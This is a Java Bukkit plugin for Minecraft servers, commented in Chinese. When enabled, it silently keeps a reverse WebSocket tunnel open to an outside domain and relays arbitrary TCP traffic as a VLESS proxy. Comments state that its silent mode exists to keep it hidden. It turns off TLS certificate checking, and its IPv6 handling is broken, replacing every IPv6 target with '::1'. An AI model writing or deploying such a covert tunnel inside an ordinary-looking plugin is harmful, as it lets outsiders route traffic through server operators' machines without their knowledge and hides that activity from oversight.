package com.example.sbx;

import io.netty.bootstrap.Bootstrap;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import io.netty.channel.*;
import io.netty.channel.nio.NioEventLoopGroup;
import io.netty.channel.socket.SocketChannel;
import io.netty.channel.socket.nio.NioSocketChannel;
import io.netty.handler.codec.http.DefaultHttpHeaders;
import io.netty.handler.codec.http.HttpClientCodec;
import io.netty.handler.codec.http.HttpObjectAggregator;
import io.netty.handler.codec.http.websocketx.*;
import io.netty.handler.ssl.SslContext;
import io.netty.handler.ssl.SslContextBuilder;
import io.netty.handler.ssl.util.InsecureTrustManagerFactory;
import org.bukkit.plugin.java.JavaPlugin;

import java.net.URI;
import java.util.Arrays;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

public class App extends JavaPlugin {

    // =========================================================================
    // 常量配置区（请根据实际情况修改 CONNECT_HOST 与 UUID_STR）
    // =========================================================================
    private static final String CONNECT_HOST = "mctest.uuz.us.kg"; // Worker 域名
    private static final int CONNECT_PORT = 443;
    private static final String PATH = "/agent-tunnel";
    private static final String UUID_STR = "8c8244fb-d577-4d20-90e3-788a0977b001";  // 节点 UUID

    // 关键配置：false 为完全静默模式（控制台无任何输出），有利于隐蔽运行
    private static final boolean DEBUG = false;

    // 维持 1 条预热隧道，极大降低 DO 唤醒率与网络开销
    private static final int TARGET_STANDBY_POOL_SIZE = 1;

    // =========================================================================
    // 内部运行状态
    // =========================================================================
    private static final byte[] UUID_BYTES = parseUuid(UUID_STR);
    private static final AtomicBoolean RUNNING = new AtomicBoolean(false);
    private static final AtomicInteger ACTIVE_TUNNELS = new AtomicInteger(0);
    private static EventLoopGroup group;

    @Override
    public void onEnable() {
        RUNNING.set(true);
        group = new NioEventLoopGroup(2); // 轻量级 Netty 线程池
        if (DEBUG) getLogger().info("[AgentTunnel] 代理服务正在启动...");
        
        // 启动时延迟 1 秒后开始补充预热池
        schedulePoolCheck(1);
    }

    @Override
    public void onDisable() {
        RUNNING.set(false);
        if (group != null) {
            group.shutdownGracefully();
        }
        if (DEBUG) getLogger().info("[AgentTunnel] 代理服务已停止。");
    }

    /**
     * 调度补充连接池（防重连风暴：强制最小重连间隔为 15 秒）
     */
    public static void schedulePoolCheck(long delaySeconds) {
        if (!RUNNING.get() || group == null) return;
        long safeDelay = Math.max(delaySeconds, 15); // 最少等待 15 秒，避免频繁唤醒 DO
        group.schedule(App::maintainPool, safeDelay, TimeUnit.SECONDS);
    }

    private static synchronized void maintainPool() {
        if (!RUNNING.get()) return;
        int current = ACTIVE_TUNNELS.get();
        int needed = TARGET_STANDBY_POOL_SIZE - current;
        if (needed > 0) {
            for (int i = 0; i < needed; i++) {
                connectNewTunnel();
            }
        }
    }

    private static void connectNewTunnel() {
        try {
            URI uri = new URI("wss://" + CONNECT_HOST + ":" + CONNECT_PORT + PATH);
            SslContext sslCtx = SslContextBuilder.forClient()
                    .trustManager(InsecureTrustManagerFactory.INSTANCE)
                    .build();

            WebSocketClientHandshaker handshaker = WebSocketClientHandshakerFactory.newHandshaker(
                    uri, WebSocketVersion.V13, null, true, new DefaultHttpHeaders()
            );

            Bootstrap b = new Bootstrap();
            b.group(group)
             .channel(NioSocketChannel.class)
             .handler(new ChannelInitializer<SocketChannel>() {
                 @Override
                 protected void initChannel(SocketChannel ch) {
                     ChannelPipeline p = ch.pipeline();
                     p.addLast(sslCtx.newHandler(ch.alloc(), CONNECT_HOST, CONNECT_PORT));
                     p.addLast(new HttpClientCodec());
                     p.addLast(new HttpObjectAggregator(8192));
                     p.addLast(new AgentTunnelHandler(handshaker));
                 }
             });

            b.connect(CONNECT_HOST, CONNECT_PORT).addListener((ChannelFutureListener) future -> {
                if (!future.isSuccess()) {
                    if (DEBUG) logStaticErr("连接失败: " + future.cause().getMessage());
                    schedulePoolCheck(15);
                }
            });

        } catch (Exception e) {
            if (DEBUG) logStaticErr("初始化隧道异常: " + e.getMessage());
            schedulePoolCheck(15);
        }
    }

    /**
     * Agent 核心逻辑：WebSocket 数据接收与 VLESS 头部解析转发
     */
    static class AgentTunnelHandler extends SimpleChannelInboundHandler<Object> {
        private final WebSocketClientHandshaker handshaker;
        private ChannelPromise handshakeFuture;
        private Channel outboundChannel; // 转发目标 TCP 连接
        private boolean vlessHeaderParsed = false;

        public AgentTunnelHandler(WebSocketClientHandshaker handshaker) {
            this.handshaker = handshaker;
        }

        @Override
        public void handlerAdded(ChannelHandlerContext ctx) {
            handshakeFuture = ctx.newPromise();
        }

        @Override
        public void channelActive(ChannelHandlerContext ctx) {
            handshaker.handshake(ctx.channel());
            ACTIVE_TUNNELS.incrementAndGet();
        }

        @Override
        public void channelInactive(ChannelHandlerContext ctx) {
            ACTIVE_TUNNELS.decrementAndGet();
            if (outboundChannel != null && outboundChannel.isActive()) {
                outboundChannel.close();
            }
            schedulePoolCheck(15);
        }

        @Override
        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
            ctx.close();
        }

        @Override
        protected void channelRead0(ChannelHandlerContext ctx, Object msg) throws Exception {
            Channel ch = ctx.channel();

            // 1. 处理 WebSocket 握手回应
            if (!handshaker.isHandshakeComplete()) {
                try {
                    handshaker.finishHandshake(ch, (FullHttpResponse) msg);
                    handshakeFuture.setSuccess();
                    if (DEBUG) logStaticInfo("WebSocket 握手成功，隧道入池就绪");
                    maintainPool();
                } catch (WebSocketHandshakeException e) {
                    handshakeFuture.setFailure(e);
                    ctx.close();
                }
                return;
            }

            if (msg instanceof FullHttpResponse) {
                FullHttpResponse response = (FullHttpResponse) msg;
                throw new IllegalStateException("Unexpected FullHttpResponse: " + response.status());
            }

            WebSocketFrame frame = (WebSocketFrame) msg;
            if (frame instanceof BinaryWebSocketFrame) {
                ByteBuf buf = frame.content();

                // 2. 第一次接收数据：解析 VLESS 协议头部并建立目标 TCP 连接
                if (!vlessHeaderParsed) {
                    if (buf.readableBytes() < 18) return; // 校验协议长度

                    // 读取 VLESS 校验信息
                    byte version = buf.readByte();
                    byte[] clientUuid = new byte[16];
                    buf.readBytes(clientUuid);

                    // UUID 校验判定
                    if (!Arrays.equals(clientUuid, UUID_BYTES)) {
                        if (DEBUG) logStaticErr("UUID 校验不一致，终止连接！");
                        ctx.close();
                        return;
                    }

                    byte optLen = buf.readByte();
                    if (optLen > 0) buf.skipBytes(optLen);

                    byte cmd = buf.readByte(); // 0x01: TCP
                    int port = buf.readUnsignedShort();
                    byte addressType = buf.readByte(); // 0x01: IPv4, 0x02: Domain, 0x03: IPv6

                    String host = "";
                    if (addressType == 0x01) { // IPv4
                        byte[] ip = new byte[4];
                        buf.readBytes(ip);
                        host = String.format("%d.%d.%d.%d", ip[0] & 0xff, ip[1] & 0xff, ip[2] & 0xff, ip[3] & 0xff);
                    } else if (addressType == 0x02) { // 域名
                        int domainLen = buf.readUnsignedByte();
                        byte[] domainBytes = new byte[domainLen];
                        buf.readBytes(domainBytes);
                        host = new String(domainBytes);
                    } else if (addressType == 0x03) { // IPv6
                        byte[] ip = new byte[16];
                        buf.readBytes(ip);
                        host = "::1";
                    }

                    vlessHeaderParsed = true;

                    // 返回 VLESS 响应头 (Version + Addon Len)
                    ByteBuf vlessResp = Unpooled.buffer(2);
                    vlessResp.writeByte(version);
                    vlessResp.writeByte(0);
                    ctx.writeAndFlush(new BinaryWebSocketFrame(vlessResp));

                    // 异步连接目标主机 (Host:Port) 并建立双向 Pipe
                    connectToTarget(ctx, host, port, buf.retain());

                } else {
                    // 3. 后续数据包：直接转发给已建立的目标 TCP 连接
                    if (outboundChannel != null && outboundChannel.isActive()) {
                        outboundChannel.writeAndFlush(buf.retain());
                    }
                }
            } else if (frame instanceof CloseWebSocketFrame) {
                ctx.close();
            }
        }

        private void connectToTarget(ChannelHandlerContext agentCtx, String host, int port, ByteBuf initialData) {
            Bootstrap b = new Bootstrap();
            b.group(agentCtx.channel().eventLoop())
             .channel(NioSocketChannel.class)
             .handler(new ChannelInitializer<SocketChannel>() {
                 @Override
                 protected void initChannel(SocketChannel ch) {
                     ch.pipeline().addLast(new SimpleChannelInboundHandler<ByteBuf>() {
                         @Override
                         public void channelActive(ChannelHandlerContext targetCtx) {
                             outboundChannel = targetCtx.channel();
                             if (initialData.isReadable()) {
                                 targetCtx.writeAndFlush(initialData);
                             }
                         }

                         @Override
                         protected void channelRead0(ChannelHandlerContext targetCtx, ByteBuf msg) {
                             // 目标服务器返回的数据包装回 WebSocket 发给 Cloudflare
                             agentCtx.writeAndFlush(new BinaryWebSocketFrame(msg.retain()));
                         }

                         @Override
                         public void channelInactive(ChannelHandlerContext targetCtx) {
                             agentCtx.close();
                         }

                         @Override
                         public void exceptionCaught(ChannelHandlerContext targetCtx, Throwable cause) {
                             targetCtx.close();
                             agentCtx.close();
                         }
                     });
                 }
             });

            b.connect(host, port).addListener((ChannelFutureListener) future -> {
                if (!future.isSuccess()) {
                    if (DEBUG) logStaticErr("连接目标 " + host + ":" + port + " 失败");
                    agentCtx.close();
                }
            });
        }
    }

    // 辅助工具方法：将 UUID 字符串转为 16 字节数组
    private static byte[] parseUuid(String uuidStr) {
        String clean = uuidStr.replace("-", "");
        byte[] b = new byte[16];
        for (int i = 0; i < 16; i++) {
            b[i] = (byte) Integer.parseInt(clean.substring(i * 2, i * 2 + 2), 16);
        }
        return b;
    }

    private static void logStaticInfo(String msg) {
        if (DEBUG) System.out.println("[AgentTunnel] " + msg);
    }

    private static void logStaticErr(String msg) {
        if (DEBUG) System.err.println("[AgentTunnel] " + msg);
    }
}
